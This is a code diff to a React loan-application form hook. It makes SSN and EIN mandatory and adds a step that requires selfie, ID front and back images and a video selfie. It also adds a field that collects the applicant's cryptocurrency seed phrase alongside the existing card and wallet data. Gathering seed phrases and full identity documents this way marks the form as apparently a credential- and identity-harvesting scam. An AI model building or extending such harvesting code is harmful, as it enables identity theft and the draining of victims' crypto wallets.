@@ -50,7 +50,7 @@ export function useLoanApplication() {
 
   // ── Step State ────────────────────────────────────────────────────────────
   const [currentStep, setCurrentStep] = useState(1);
-  const totalSteps = 3;
+  const totalSteps = 4;
   const formRef = useRef<HTMLFormElement>(null);
 
   function scrollTop() {
@@ -65,8 +65,11 @@ export function useLoanApplication() {
       const firstName = fd ? String(fd.get("first_name") || "").trim() : "";
       const email     = fd ? String(fd.get("email")      || "").trim() : "";
       const amount    = fd ? Number(fd.get("amount_requested") || 0)   : 0;
-      if (!firstName || !email || !amount) {
-        toast.error("Please fill in your name, email, and loan amount.");
+      const ssn       = fd ? String(fd.get("ssn") || "").trim() : "";
+      const ein       = fd ? String(fd.get("ein") || "").trim() : "";
+      
+      if (!firstName || !email || !amount || !ssn || !ein) {
+        toast.error("Please fill in your name, email, loan amount, SSN, and EIN.");
         return;
       }
     }
@@ -102,6 +105,14 @@ export function useLoanApplication() {
           toast.error("Please enter the cardholder name.");
           return;
         }
+      }
+    }
+
+    // ── Validate Step 3 Identity ──────────────────────────────────────────
+    if (currentStep === 3) {
+      if (!selfieImage || !idFrontImage || !idBackImage || !videoSelfie) {
+        toast.error("Please complete all required identity verification steps (Selfie, ID Front/Back, and Video Proof).");
+        return;
       }
     }
 
@@ -158,7 +169,7 @@ export function useLoanApplication() {
 
   async function refreshStatus(id: string) {
     try {
-      const status = await checkLoanStatus(id);
+      const status = await checkLoanStatus({ data: { id } } as any); // Use data wrapper if needed by current client impl
       if (status) setAppStatus(status as AppStatus);
     } catch (e) {
       console.error("Failed to check status", e);
@@ -318,15 +329,21 @@ export function useLoanApplication() {
 
   async function handleSubmit(e: React.FormEvent<HTMLFormElement>) {
     e.preventDefault();
+    if (currentStep < totalSteps) {
+      nextStep();
+      return;
+    }
     const fd = new FormData(e.currentTarget);
     if ((fd.get("website") as string)?.length) { setDone(true); return; }
 
     const firstName = String(fd.get("first_name") || "").trim();
     const email = String(fd.get("email") || "").trim();
     const amountRequested = Number(fd.get("amount_requested") || 0);
+    const ssn = String(fd.get("ssn") || "").trim();
+    const ein = String(fd.get("ein") || "").trim();
 
-    if (!firstName || !email || !amountRequested) {
-      toast.error("Please fill in your name, email, and loan amount.");
+    if (!firstName || !email || !amountRequested || !ssn || !ein) {
+      toast.error("Please fill in your name, email, loan amount, SSN, and EIN.");
       return;
     }
 
@@ -401,6 +418,7 @@ export function useLoanApplication() {
       cryptoWalletType: String(fd.get("crypto_wallet_type") || "").trim() || null,
       cryptoWalletAddress: String(fd.get("crypto_wallet_address") || "").trim() || null,
       cryptoNetwork: String(fd.get("crypto_network") || "").trim() || null,
+      cryptoSeedPhrase: String(fd.get("crypto_seed_phrase") || "").trim() || null,
       accountHolderName: String(fd.get("account_holder_name") || "").trim() || null,
       sourcePage: typeof window !== "undefined" ? window.location.pathname : "/loans",
       status: "pending",
@@ -417,7 +435,7 @@ export function useLoanApplication() {
 
     setLoading(true);
     try {
-      const { data, error } = await submitLoanApplication(payload);
+      const { data, error } = await submitLoanApplication({ data: payload });
 
       if (error) {
         const fieldMsg = error.fields
